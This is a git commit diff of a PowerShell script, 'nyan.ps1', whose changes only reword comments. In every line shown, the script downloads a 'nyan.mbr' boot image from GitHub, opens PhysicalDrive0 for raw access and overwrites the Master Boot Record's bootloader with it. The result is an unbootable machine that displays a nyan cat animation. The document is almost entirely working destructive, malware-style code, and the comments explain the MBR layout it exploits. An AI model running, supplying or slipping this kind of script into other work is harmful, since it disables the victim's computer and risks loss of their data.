2d6a0c2a749d1eedd2dbe8f3e7c9b11360d2b7dd
Philos <146400577+Phil-OS@users.noreply.github.com>
2025-10-05 13:19:35 -0400

    Final cat

--- nyan.ps1
+++ nyan.ps1
@@ -1,23 +1,25 @@
-# Download raw nyan.mbr binary (512 bytes)
+# Context: MBR is 512 bytes long. First 446 is the bootloader, next 64 is the partiton table, and the final 2 are a boot signature. We want to overwrite the bootloader but leave the other 2 alone
+
+# Download nyan.mbr
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/brainsmoke/nyanmbr/master/nyan.mbr' -OutFile "$env:TEMP\nyan.mbr" -UseBasicParsing
 
-# Read the downloaded file
+# Read in raw bytes of file (nyan cat is only 444 bytes)
 $bootBytes = [System.IO.File]::ReadAllBytes("$env:TEMP\nyan.mbr")
 
-# Create a 446-byte boot code array
+# Create a 446-byte bootcode array
 $bootCode446 = New-Object byte[] 446
-[Array]::Copy($bootBytes, 0, $bootCode446, 0, $bootBytes.Length)  # copy existing bytes
-# remaining bytes (443..445) default to 0x00
+[Array]::Copy($bootBytes, 0, $bootCode446, 0, $bootBytes.Length)  # copy in the nyan bootcode, pads 443-445 with 0x00
+
 
 # Read existing MBR
 $fs = New-Object System.IO.FileStream("\\.\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)
 $sector = New-Object byte[] 512
 $fs.Read($sector,0,512) | Out-Null
 
-# Copy padded boot code into MBR
+# Replace bootcode of the MBR with nyan cat
 [Array]::Copy($bootCode446, 0, $sector, 0, 446)
 
-# Write back
+# Write back modified bootcode
 $fs.Seek(0,[System.IO.SeekOrigin]::Begin) | Out-Null
 $fs.Write($sector,0,512)
 $fs.Flush()
